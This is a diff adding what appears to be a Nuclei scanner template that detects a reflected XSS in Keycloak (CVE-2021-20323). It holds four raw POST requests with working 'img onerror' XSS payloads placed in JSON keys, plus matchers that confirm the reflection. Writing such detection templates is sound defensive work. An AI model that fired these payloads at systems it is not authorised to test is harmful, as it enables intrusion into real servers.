@@ -1,0 +1,52 @@
+id: CVE-2021-20323
+
+info:
+  name: Keycloak Reflected XSS on clients-registrations Endpoint
+  author: dkcyberz
+  severity: medium
+  description: |
+    Keycloak before 18.0.0 and after 10.0.0 contains a reflected XSS on the clients-registrations endpoint. 
+    The bug is triggered by providing, by POST, a json structure with a key as parameter name that is not supported by the endpoint. 
+    The response return reflects the json key in an error message and with header set as Content-Type: text/html. 
+    When executed in a browser, html code from the json key is interpreted allowing to trigger JavaScript code. 
+    No authentication is required and the bug impacts all available realms.
+
+http:
+  - raw:
+      - |
+        POST /realms/master/clients-registrations/default HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {"<img src=x onerror=\"alert('keycloack_xss')\"/>":1}
+      - |
+        POST /realms/master/clients-registrations/openid-connect HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {"<img src=x onerror=\"alert('keycloack_xss')\"/>":1}
+      - |
+        POST /auth/realms/master/clients-registrations/default HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json;charset=UTF-8
+
+        {"<img onerror=confirm('keycloack_xss') src/>":1}
+      - |
+        POST /auth/realms/master/clients-registrations/openid-connect HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json;charset=UTF-8
+
+        {"<img onerror=confirm('keycloack_xss') src/>":1}
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "keycloack_xss"
+      - type: regex
+        part: header
+        regex:
+          - "Content-Type: text/html"
+      - type: status
+        status:
+          - 400
